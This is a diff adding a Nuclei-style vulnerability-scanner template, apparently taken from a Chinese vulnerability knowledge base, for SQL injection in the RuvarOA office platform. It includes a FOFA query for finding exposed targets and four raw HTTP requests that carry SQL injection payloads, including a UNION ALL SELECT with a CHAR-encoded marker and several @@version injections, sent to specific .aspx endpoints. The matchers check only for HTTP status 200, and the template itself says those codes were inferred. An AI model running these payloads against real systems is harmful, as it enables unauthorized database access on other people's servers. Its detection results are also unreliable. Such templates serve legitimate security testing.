@@ -1,0 +1,79 @@
+id: poc-pn0rlo8wnah990z1
+info:
+  name: RuvarOA协同办公平台12处存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pn0rlo8wnah990z1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pn0rlo8wnah990z1
+    fofa: body="txt_admin_key"
+http:
+- raw:
+  - 'GET /DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2bCHAR%28106%29%2bCHAR%28118%29%2bCHAR%2898%29%2bCHAR%28113%29%2bCHAR%2873%29%2bCHAR%28107%29%2bCHAR%2866%29%2bCHAR%2881%29%2bCHAR%2871%29%2bCHAR%2889%29%2bCHAR%28114%29%2bCHAR%2888%29%2bCHAR%2871%29%2bCHAR%2876%29%2bCHAR%2866%29%2bCHAR%2890%29%2bCHAR%2886%29%2bCHAR%2874%29%2bCHAR%28109%29%2bCHAR%2898%29%2bCHAR%28106%29%2bCHAR%28107%29%2bCHAR%2885%29%2bCHAR%2871%29%2bCHAR%2877%29%2bCHAR%2899%29%2bCHAR%2885%29%2bCHAR%28103%29%2bCHAR%28118%29%2bCHAR%28101%29%2bCHAR%28120%29%2bCHAR%2874%29%2bCHAR%28117%29%2bCHAR%28109%29%2bCHAR%2865%29%2bCHAR%2882%29%2bCHAR%28105%29%2bCHAR%2876%29%2bCHAR%28102%29%2bCHAR%28120%29%2bCHAR%2887%29%2bCHAR%28101%29%2bCHAR%28105%29%2bCHAR%2884%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /ContractManage/get_company.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 495
+
+
+    __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&ddl_type=&ddl_field=dw_bh&txt_keyword=1''+UNION+ALL+SELECT+@@version--+CwAf&btnSearch=%E6%9F%A5%E8%AF%A2&pager_input=1&pager_select=20&txt_row_index=&txt_dw_id=&txt_dw_mc=&txt_dw_bh=&txt_dw_lxr=&txt_dw_dh='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /WorkFlow/wf_work_form_save.aspx?office_missive_id=@@version HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
